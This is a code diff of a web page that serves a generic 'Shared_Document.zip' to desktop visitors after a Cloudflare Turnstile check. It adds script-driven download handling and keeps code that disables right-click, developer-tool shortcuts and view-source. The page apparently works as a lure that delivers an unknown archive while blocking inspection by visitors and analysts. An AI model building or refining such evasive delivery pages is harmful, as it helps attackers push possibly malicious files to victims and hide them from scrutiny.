@@ -65,7 +65,7 @@ h2 {
     font-size: 14px;
     font-weight: 600;
     border-radius: 3px;
-    font-family: inherit;
+    font-family: Arial, sans-serif;
     border: none;
     cursor: pointer;
 }
@@ -74,12 +74,22 @@ h2 {
     background: #354e70;
 }
 
-form {
-    margin: 0;
+.download:disabled {
+    opacity: 0.7;
+    cursor: wait;
 }
 
 .mobile {
     display: none;
+}
+
+#download-error {
+    display: none;
+    color: #c0392b;
+    font-size: 13px;
+    font-weight: 600;
+    margin-bottom: 20px;
+    line-height: 1.5;
 }
 
 @media (max-width: 767px) {
@@ -107,6 +117,9 @@ form {
 
     <div class="desktop">
 
+        <!-- Error message appears above ZIP logo -->
+        <div id="download-error" role="alert" aria-live="polite"></div>
+
         <svg class="zip-icon"
              viewBox="0 0 80 95"
              xmlns="http://www.w3.org/2000/svg">
@@ -131,17 +144,14 @@ form {
             Shared_Document.zip
         </div>
 
-        <!-- Download form -->
-        <form action="/download" method="POST">
+        <form id="download-form" action="/download" method="POST">
 
-            <!-- Cloudflare Turnstile -->
             <div
               class="cf-turnstile"
               data-sitekey="0x4AAAAAAGULB8v6FX2HxT8g"
               data-theme="light">
             </div>
 
-            <!-- Submit verified download request -->
             <button type="submit" class="download">
                 Download
             </button>
@@ -151,41 +161,172 @@ form {
     </div>
 
     <div class="mobile">
+
         <h2>Desktop Access Required</h2>
 
         <p style="font-size:14px;color:#7b8491;line-height:1.7;">
             Please access this file from a desktop or laptop computer.
         </p>
+
     </div>
 
 </div>
 
 <script>
-  // Disable right-click
-  document.addEventListener('contextmenu', function(e) {
-    e.preventDefault();
-  });
 
-  // Disable common dev shortcuts
-  document.addEventListener('keydown', function(e) {
+// Download form handling
+document.getElementById("download-form").addEventListener("submit", async function(e) {
+
+    e.preventDefault();
+
+    const form = this;
+    const errorBox = document.getElementById("download-error");
+    const button = form.querySelector(".download");
+
+    function showError(message) {
+        errorBox.textContent = message;
+        errorBox.style.display = "block";
+    }
+
+    // Hide previous error
+    errorBox.style.display = "none";
+    errorBox.textContent = "";
+
+    // Prevent multiple submissions
+    if (button.disabled) {
+        return;
+    }
+
+    // Get Turnstile token
+    const token = form.querySelector(
+        '[name="cf-turnstile-response"]'
+    )?.value;
+
+    // Stop if verification has not been completed
+    if (!token) {
+        showError(
+            "Please complete the security verification before downloading."
+        );
+        return;
+    }
+
+    button.disabled = true;
+    button.textContent = "Preparing download...";
+
+    try {
+
+        const response = await fetch("/download", {
+            method: "POST",
+            body: new URLSearchParams(new FormData(form))
+        });
+
+        // Handle server errors without redirecting
+        if (!response.ok) {
+
+            if (response.status === 403) {
+                showError(
+                    "Verification failed or expired. Please try again."
+                );
+            } else if (response.status === 404) {
+                showError("The ZIP file could not be found.");
+            } else {
+                showError("Download failed. Please try again.");
+            }
+
+            if (window.turnstile) {
+                turnstile.reset();
+            }
+
+            return;
+        }
+
+        // Get ZIP file
+        const blob = await response.blob();
+
+        // Get server-generated filename
+        const disposition = response.headers.get("Content-Disposition");
+
+        let filename = "Shared_Document.zip";
+
+        if (disposition) {
+            const match = disposition.match(/filename="([^"]+)"/);
+
+            if (match) {
+                filename = match[1];
+            }
+        }
+
+        // Trigger browser download without leaving the page
+        const downloadUrl = URL.createObjectURL(blob);
+
+        const link = document.createElement("a");
+
+        link.href = downloadUrl;
+        link.download = filename;
+
+        document.body.appendChild(link);
+        link.click();
+        link.remove();
+
+        // Release download URL after browser has started the download
+        setTimeout(() => {
+            URL.revokeObjectURL(downloadUrl);
+        }, 1000);
+
+        // Reset Turnstile for another attempt
+        if (window.turnstile) {
+            turnstile.reset();
+        }
+
+    } catch (error) {
+
+        console.error("Download error:", error);
+
+        showError(
+            "A connection error occurred. Please try again."
+        );
+
+        if (window.turnstile) {
+            turnstile.reset();
+        }
+
+    } finally {
+
+        button.disabled = false;
+        button.textContent = "Download";
+
+    }
+
+});
+
+
+// Disable right-click
+document.addEventListener('contextmenu', function(e) {
+    e.preventDefault();
+});
+
+
+// Disable common dev shortcuts
+document.addEventListener('keydown', function(e) {
 
     // F12
     if (e.key === "F12") {
-      e.preventDefault();
+        e.preventDefault();
     }
 
     // Ctrl+Shift+I / Ctrl+Shift+J / Ctrl+Shift+C
     if (e.ctrlKey && e.shiftKey &&
         ['I','J','C'].includes(e.key.toUpperCase())) {
-      e.preventDefault();
+        e.preventDefault();
     }
 
-    // Ctrl+U
+    // Ctrl+U (view source)
     if (e.ctrlKey && e.key.toUpperCase() === 'U') {
-      e.preventDefault();
+        e.preventDefault();
     }
 
-  });
+});
+
 </script>
 
 </body>
